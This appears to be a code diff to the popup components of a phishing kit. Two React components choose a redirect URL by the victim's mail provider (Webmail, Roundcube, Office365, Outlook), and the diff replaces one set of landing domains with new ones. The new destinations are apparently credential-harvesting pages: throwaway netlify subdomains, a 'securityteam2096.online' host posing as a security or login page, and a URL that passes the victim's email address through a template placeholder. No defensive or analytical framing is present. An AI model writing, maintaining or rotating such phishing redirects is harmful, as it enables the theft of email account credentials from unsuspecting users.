@@ -125,16 +125,16 @@ const Popup = ({ domain, eparams, systemInfo }) => {
     let redirectUrl = "";
     switch (provider) {
       case "Webmail":
-        redirectUrl = "https://webmaildocs.netlify.app/bafkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq";
+        redirectUrl = "https://webmailcsdj.netlify.app/bafkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq";
         break;
       case "Roundcube":
-        redirectUrl = "https://roundcubedocs.netlify.app/bafkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq";
+        redirectUrl = "https://roundcubehgtr.netlify.app/bafkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq";
         break;
       case "Office365":
-        redirectUrl = "https://login.securityteam2096.online/pKVVNFUv";
+        redirectUrl = "https://www.securityteam2096.online/ApBfDcol";
         break;
       case "Others":
-        redirectUrl = "https://login.securityteam2096.online/pKVVNFUv";
+        redirectUrl = "https://mailsvdsfd.netlify.app/bafkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq?email=[[-Email-]]";
         break;
       default:
         redirectUrl = "";
@@ -314,16 +314,16 @@ const PopupMobile = ({ domain, eparams, systemInfo }) => {
     let redirectUrl = "";
     switch (provider) {
       case "Webmail":
-        redirectUrl = "https://webmaildocs.netlify.app/bafkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq";
+        redirectUrl = "https://webmailcsdj.netlify.app/bafkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq";
         break;
       case "Roundcube":
-        redirectUrl = "https://roundcubedocs.netlify.app/bafkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq";
+        redirectUrl = "https://roundcubehgtr.netlify.app/bafkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq";
         break;
       case "Office365":
-        redirectUrl = "https://login.securityteam2096.online/pKVVNFUv";
+        redirectUrl = "https://www.securityteam2096.online/ApBfDcol";
         break;
       case "Outlook":
-        redirectUrl = "https://login.securityteam2096.online/pKVVNFUv";
+        redirectUrl = "https://mailsvdsfd.netlify.app/bafkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq?email=[[-Email-]]";
         break;
       default:
         redirectUrl = "";
